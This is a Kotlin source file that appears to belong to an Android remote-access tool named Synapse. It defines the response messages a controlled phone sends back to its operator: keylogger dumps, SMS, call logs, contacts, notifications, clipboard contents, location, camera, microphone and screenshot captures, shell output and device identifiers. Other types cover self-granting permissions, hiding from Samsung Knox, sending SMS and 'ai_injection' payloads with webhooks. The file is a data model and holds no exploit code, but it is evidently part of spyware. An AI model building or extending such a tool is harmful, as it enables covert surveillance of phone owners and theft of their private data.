package org.synapse.core.core

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

// ─── Sealed class hierarchy of all typed responses ──────────────────────────

@Serializable
sealed class SynapseResponse {

    @Serializable
    @SerialName("ping")
    data class PingResponse(
        val pong: Boolean = true,
        val latency_ms: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("device_info")
    data class DeviceInfoResponse(
        val model: String,
        val brand: String,
        val manufacturer: String,
        val sdk: Int,
        val release: String,
        val fingerprint: String,
        val hardware: String,
        val android_id: String,
        val imei: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("file_list")
    data class FileListResponse(
        val entries: List<FileEntry>
    ) : SynapseResponse()

    @Serializable
    @SerialName("file_read")
    data class FileReadResponse(
        val file_id: String,
        val mime_type: String,
        val size_bytes: Long,
        val base64_data: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("location")
    data class LocationResponse(
        val lat: Double,
        val lng: Double,
        val accuracy: Float,
        val provider: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("shell")
    data class ShellResponse(
        val exit_code: Int,
        val stdout: String,
        val stderr: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("camera")
    data class CameraResponse(
        val image_base64: String,
        val width: Int = 0,
        val height: Int = 0,
        val format: String = "JPEG",
        val size_bytes: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("clipboard")
    data class ClipboardResponse(
        val provider_type: String,
        val vulnerability: String = "",
        val entry_count: Int,
        val entries: List<ClipboardEntry>
    ) : SynapseResponse()

    @Serializable
    @SerialName("permission_grant")
    data class PermissionGrantResponse(
        val target_permissions: List<String>,
        val granted: List<String>,
        val failed: List<String>,
        val details: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("knox_hide")
    data class KnoxHideResponse(
        val technique: String,
        val success: Boolean,
        val service_status: String,
        val target_package: String = "",
        val details: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("sms_list")
    data class SmsListResponse(
        val messages: List<SmsMessage>,
        val count: Int
    ) : SynapseResponse()

    @Serializable
    @SerialName("calls_list")
    data class CallLogResponse(
        val calls: List<CallEntry>,
        val count: Int
    ) : SynapseResponse()

    @Serializable
    @SerialName("contacts_list")
    data class ContactsResponse(
        val contacts: List<ContactEntry>,
        val count: Int
    ) : SynapseResponse()

    @Serializable
    @SerialName("screenshot")
    data class ScreenshotResponse(
        val image_base64: String,
        val width: Int = 0,
        val height: Int = 0,
        val format: String = "PNG",
        val size_bytes: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("mic_recording")
    data class MicRecordingResponse(
        val audio_base64: String,
        val duration_seconds: Int,
        val format: String = "AAC",
        val size_bytes: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("notifications_list")
    data class NotificationsResponse(
        val notifications: List<NotificationEntry>,
        val count: Int
    ) : SynapseResponse()

    @Serializable
    @SerialName("keylog_dump")
    data class KeylogResponse(
        val keystrokes: List<KeylogEntry>,
        val count: Int
    ) : SynapseResponse()

    @Serializable
    @SerialName("ai_injection")
    data class AiInjectionResponse(
        val action: String,
        val payload_type: String,
        val payload_size: Int,
        val webhook: String,
        val routes: Map<String, String>,
        val success: Boolean,
        val details: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("sms_send")
    data class SmsSendResponse(
        val success: Boolean,
        val destination: String,
        val message: String,
        val details: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("error")
    data class ErrorResponse(
        val error: String,
        val module: String
    ) : SynapseResponse()
}

// ─── Supporting types ───────────────────────────────────────────────────────

@Serializable
data class FileEntry(
    val id: String,
    val name: String,
    val size: Long,
    val date: Long,
    val path: String = ""
)

@Serializable
data class ClipboardEntry(
    val text: String = "",
    val mime_type: String = "text/plain",
    val timestamp: Long = 0,
    val uri: String = ""
)

@Serializable
data class SmsMessage(
    val id: String = "",
    val address: String = "",
    val body: String = "",
    val date: Long = 0,
    val read: Boolean = false,
    val type: String = "inbox"  // inbox, sent, draft
)

@Serializable
data class CallEntry(
    val number: String = "",
    val type: String = "",  // incoming, outgoing, missed
    val date: Long = 0,
    val duration: Long = 0
)

@Serializable
data class ContactEntry(
    val display_name: String = "",
    val phone_numbers: List<String> = emptyList(),
    val emails: List<String> = emptyList()
)

@Serializable
data class NotificationEntry(
    val package_name: String = "",
    val app_name: String = "",
    val title: String = "",
    val text: String = "",
    val timestamp: Long = 0
)

@Serializable
data class KeylogEntry(
    val text: String = "",
    val package_name: String = "",
    val timestamp: Long = 0
)

// ─── Response envelope — wraps all typed responses for transport ────────────

@Serializable
data class ResponseEnvelope(
    val type: String,
    val timestamp: Long = System.currentTimeMillis(),
    val device_id: String = "",
    val cmd_id: String = "",
    val status: String = "ok",
    val payload: SynapseResponse? = null,
    val error: String = ""
)
